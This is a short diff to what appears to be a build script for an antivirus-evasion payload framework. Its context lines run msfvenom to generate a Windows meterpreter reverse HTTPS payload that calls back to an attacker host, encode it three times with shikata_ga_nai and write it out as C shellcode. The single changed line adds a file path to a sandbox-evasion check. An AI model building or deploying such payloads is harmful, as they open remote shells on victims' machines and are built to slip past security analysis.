@@ -23,7 +23,7 @@ LHOST=$GLOBAL_LHOST
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
 
 # add fopen sandbox evasion
-add_evasion fopen_sandbox_evasion
+add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
 
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
